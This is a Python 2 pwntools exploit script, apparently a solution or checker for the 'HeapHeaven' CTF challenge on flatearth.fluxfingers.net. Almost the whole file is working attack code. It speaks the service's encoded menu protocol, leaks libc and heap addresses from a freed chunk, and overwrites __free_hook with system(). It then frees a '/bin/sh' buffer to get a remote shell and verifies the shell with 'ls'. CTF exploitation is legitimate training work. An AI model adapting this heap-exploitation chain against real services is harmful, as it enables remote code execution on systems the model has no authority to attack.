#!/usr/bin/python2
# Author: Sceptic
# Packages: pip install pwntools && pip install parse
# Timeout: 120 Seconds
# Interval: 5 Minutes
# Host: flatearth.fluxfingers.net
# Port: 1743
from pwn import *
from time import sleep
from sys import argv
from parse import parse

libc = ELF("libc.so.6")

interactive = False
OFFSET_LEAK = 0x7FC6EF401B78-0x7FC6EF03D000
OFFSET_FREE_HOOK = libc.symbols["__free_hook"]
OFFSET_SYSTEM = libc.symbols["system"]

if len(argv) >= 3:
    HOST = argv[1]
    PORT = int(argv[2])
else:
    HOST = "ubuntu"
    PORT = 4444

if interactive:
    raw_input("go...")

def recv_menu(r):
    r.recvuntil("NOM-NOM\n")

def encode_num(num):
    s = bin(num)[2:].rjust(64, "0").replace("1", "wi").replace("0", "wa")
    if interactive:
        print("generated number encoding for {:d} [{}]: {}".format(num, bin(num), s))
    return s

def alloc(r, n):
    recv_menu(r)
    r.send("whaa!".ljust(8, "\0"))
    r.recvuntil("happa happa, darling...\n")
    r.sendline(encode_num(n))

def read(r, offset):
    recv_menu(r)
    r.send("mommy?".ljust(8, "\0"))
    r.sendline(encode_num(offset))
    r.recvuntil("See what we have here, darling: ")
    TOKEN = "\n====="
    return r.recvuntil(TOKEN)[:-len(TOKEN)] 

def write(r, offset, pl):
    assert("\n" not in pl)
    recv_menu(r)
    r.sendline("<spill>".ljust(8, "\0"))
    r.recvuntil("What are you doing?\n")
    r.sendline(encode_num(offset))
    r.recvuntil("Look at this mess, darling!\n")
    r.sendline(pl)

def free(r, offset):
    recv_menu(r)
    r.send("NOM-NOM".ljust(8, "\0"))
    r.sendline(encode_num(offset))

MAX_TRIES = 5
for _ in range(MAX_TRIES):
    with remote(HOST, PORT) as r:
        try:
            if interactive:
                raw_input("create...")

            for __ in range(4):
                alloc(r, 256-16)
                alloc(r, 256-16)
                
            free(r, 32)
            if interactive:
                raw_input("leak libc...")

            leak = u64(read(r, 32)+"\0\0")
            libc_base = leak - OFFSET_LEAK
            free_hook = libc_base + OFFSET_FREE_HOOK
            system = libc_base + OFFSET_SYSTEM
          
            if interactive:
                raw_input("leak heap...")
            free(r, 32+2*256)
            leak = u64(read(r, 32+8)+"\0\0")
            heap_start = leak - 2*256-32
            if interactive:
                print("Got libc base: {:016x}, free_hook: {:016x}".format(libc_base, free_hook))
                print("Got heap start leak: {:016x}".format(heap_start))
                raw_input("writes...")

            offset_heap_to_free_hook = free_hook - heap_start - 16
            write(r, 16, "/bin/sh\0")
            write(r, offset_heap_to_free_hook, p64(system))
            free(r, 16)

            CHALL = "HeapHeaven"
            if interactive:
                r.interactive()
                exit(0)
            else:
                r.sendline("ls")
                answ = r.recvuntil(CHALL, timeout=2)
                if CHALL in answ:
                    print("Success")
                    exit(0)
                else:
                    print("Fail")
                    exit(-1)
        except struct.error:
                    print("Struct error occurred")
                    continue

print("Attempts exhausted")
exit(-1)
